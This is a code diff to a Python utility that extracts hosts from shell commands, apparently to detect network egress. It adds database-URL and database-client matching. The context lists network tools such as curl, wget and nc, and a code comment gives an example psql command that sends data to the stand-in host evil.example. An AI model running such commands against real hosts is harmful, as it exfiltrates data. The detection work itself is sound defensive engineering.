@@ -117,7 +117,16 @@ _NET = frozenset({"curl", "wget", "http", "https", "xh", "httpie", "nc", "ncat",
                   "openssl", "aria2c", "lynx", "w3m"})
 _SCHEMES = r"(?:https?|wss?|ssh|git|ftps?|sftp|git\+ssh|git\+https|rsync|telnet)"
 _URL = re.compile(rf"(?i)\b{_SCHEMES}://(?:[^\s/@'\"]*@)?(\[[0-9a-f:.]+\]|[^\s/:?#'\"<>\\)\]]+)")
-_SCP = re.compile(r"(?<![\w/@.-])[\w.+-]+@([A-Za-z0-9_.-]+\.[A-Za-z]{2,}|localhost)(?=:)")
+# A database's URL is where a command sends only when a database client runs it: `psql postgres://…@evil.example
+# -c "…"` sends what is in it there; `python3 -c 'base64.b64encode("postgres://…@db.internal/orders")'`, encoding
+# a k8s Secret's values, sends nothing anywhere (k8s-01 on opencode, Nov 22).
+_DB_URL = re.compile(r"(?i)\b(?:postgres(?:ql)?|mysql|mariadb|rediss?|mongodb(?:\+srv)?|amqps?|clickhouse|mssql|sqlserver)"
+                     r"://(?:[^\s/@'\"]*@)?(\[[0-9a-f:.]+\]|[^\s/:?#'\"<>\\)\]]+)")
+_DB_CLIENTS = frozenset({"psql", "pg_dump", "pg_dumpall", "pg_restore", "pgcli", "mysql", "mysqldump", "mariadb", "mycli",
+                         "mongosh", "mongo", "mongodump", "mongorestore", "redis-cli", "sqlcmd", "clickhouse-client", "usql"})
+# `user@host:path` (scp, rsync, git). Not the password and host of a URL's `user:password@host:port`: after `:`
+# it is a URL's credentials, not a destination of its own (k8s-01: `orders:<password>@db.internal:5432`).
+_SCP = re.compile(r"(?<![\w/@.:-])[\w.+-]+@([A-Za-z0-9_.-]+\.[A-Za-z]{2,}|localhost)(?=:)")
 _HOSTLIKE = re.compile(r"(?i)^(?:[\w.+-]+@)?((?:[a-z0-9_-]+\.)+[a-z]{2,63}|\d{1,3}(?:\.\d{1,3}){3}|localhost)(?::\d+)?(?:[/?#].*)?$")
 # A bare argument with one of these endings is a file, not a host (`curl -o out.json …`).
 _FILE_ENDINGS = frozenset("""json txt md py sh bash zsh js mjs cjs ts tsx jsx yaml yml toml csv tsv log html htm css xml
@@ -161,6 +170,8 @@ def hosts_in(command: str) -> set[str]:
     """The hosts a shell command names: in URLs, as `user@host:path`, and after network commands."""
     hosts = {_norm(m.group(1)) for m in _URL.finditer(command)}
     hosts |= {_norm(m.group(1)) for m in _SCP.finditer(command)}
+    if any(PurePosixPath(w.lstrip("$(`'\"")).name in _DB_CLIENTS for words in _args(command) for w in words):
+        hosts |= {_norm(m.group(1)) for m in _DB_URL.finditer(command)}
     for words in _args(command):
         net = False
         for w in words:
